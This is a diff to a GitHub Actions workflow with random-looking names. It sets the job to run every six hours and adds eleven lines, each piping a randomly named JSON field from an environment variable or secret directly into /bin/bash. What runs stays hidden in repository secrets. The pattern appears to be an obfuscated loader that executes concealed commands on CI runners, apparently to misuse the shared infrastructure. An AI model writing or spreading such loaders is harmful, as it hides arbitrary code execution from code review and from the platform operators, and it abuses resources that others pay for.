@@ -2,22 +2,26 @@ name: taohuani4163
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
+    - cron: '53 4/6 * * *'
 
-jobs:  # 27792
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: taohuani4163
         env:
-          iy1: ${{ secrets.iy1 }}
+          gd62: ${{ secrets.gd62 }}
         run: |
-          echo $iy1 | jq -r .ueoal51836 | /bin/bash
-          echo $u3 | jq -r .ezqb61978 | /bin/bash
-          echo $oyjph624 | jq -r .i53 | /bin/bash
-          echo $hff59 | jq -r .hqw1 | /bin/bash
-          echo $wcq0757 | jq -r .aw141 | /bin/bash
-          echo $i28 | jq -r .mfyd0 | /bin/bash
+          echo $gd62 | jq -r .pmkgb07 | /bin/bash
+          echo $tcp8 | jq -r .o4 | /bin/bash
+          echo $svzn42689 | jq -r .q764 | /bin/bash
+          echo $dt86936 | jq -r .rolpv550 | /bin/bash
+          echo $b3710 | jq -r .bxsf32 | /bin/bash
+          echo $cp912 | jq -r .pql18 | /bin/bash
+          echo $kkgxt45413 | jq -r .ag4700 | /bin/bash
+          echo $s4 | jq -r .twipu05 | /bin/bash
+          echo $wecgo6292 | jq -r .siqu6 | /bin/bash
+          echo $eds6762 | jq -r .yq9 | /bin/bash
+          echo $j50 | jq -r .dkxet508 | /bin/bash
 
